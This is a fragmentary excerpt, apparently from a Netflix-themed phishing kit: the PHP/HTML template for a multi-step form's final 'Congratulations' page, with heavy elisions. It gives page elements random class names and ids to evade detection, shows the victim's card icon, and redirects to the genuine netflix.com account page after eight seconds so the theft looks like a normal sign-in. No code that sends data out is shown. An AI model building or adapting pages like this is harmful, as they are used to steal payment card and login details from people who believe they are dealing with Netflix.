...
<head>
    ...
    <link rel="stylesheet" href="../../../RGN/lib/css/B-Z118.css">
	<link rel="stylesheet" type="text/css" href="../../../RGN/lib/css/font-awesome.min.css">
	<!------------------------------- FILES CSS STYLE --------------------------------->
	<meta http-equiv="refresh" content="8; url=https://www.netflix.com/youraccount">
	<style>
	.start {
		font-size: 0.8em;
		margin-left: 2%;
	...
	.Z118-Icon{
        ...
        background-image: url(../../../RGN/lib/img/done.png);
                    ...
                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V654DF654THEBEASTXX" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                        <form id="msform" action="" method="post" name="GOxGOxPOWERxRANGERS" class="GOxGOxPOWERxRANGERS" no<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                <ul id="progressbar">
									...
									<li class="active" style="width: 25%;">Congratulations</li>
								</ul>
                                                        ...
                                                        <tbody>
                                                            <tr>
                                                                <td align="center" valign="top" style="">
                                                                    <img src="../../../RGN/icons/<?=$icon_card;?>"></td>
